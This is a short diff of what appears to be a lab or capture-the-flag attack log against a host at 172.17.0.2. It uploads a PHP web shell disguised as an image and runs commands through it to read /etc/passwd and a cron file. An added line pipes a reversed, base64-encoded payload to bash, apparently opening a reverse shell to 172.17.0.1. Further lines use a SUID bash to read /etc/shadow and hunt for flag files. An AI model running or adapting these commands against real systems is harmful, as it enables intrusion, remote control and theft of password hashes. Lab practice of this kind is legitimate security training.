@@ -369,7 +369,8 @@ curl -sS http://172.17.0.2/upload.php
 curl -F "file=@image.png.php" http://172.17.0.2/upload.php & sleep 1.4
 curl "http://172.17.0.2/uploads/image.png.php?cmd=cat+/etc/passwd" --output salida.txt
 curl "http://172.17.0.2/uploads/ghost.php?cmd=cat+/etc/passwd"
-cat /etc/cron.d/zumba-backup
+curl "http://172.17.0.2/uploads/ghost.php?cmd=cat%20%2Fetc%2Fcron.d%2Fzumba-backup"
+curl "http://172.17.0.2/uploads/ghost.php?cmd=echo%20%22%3DowJ7kiIzYiPyAyMm4DIzYCPgkWLgg2cv4Wai9iIoMWZ4V2OpQDN0QDLiEjLw4yNx4iM3EjIo4WZw92aj92cm1zaj92ckcCIy1CIwhGc%22%20%7C%20rev%20%7C%20base64%20-d%20%7C%20bash"
 cat /opt/zumba/backup.sh
 /bin/bash -p -c 'cat /etc/shadow'
 /bin/bash -p -c 'find / -maxdepth 4 -iname "*flag*" -o -iname "root.txt" -o -iname "*proof*" 2>/dev/null | head -20'
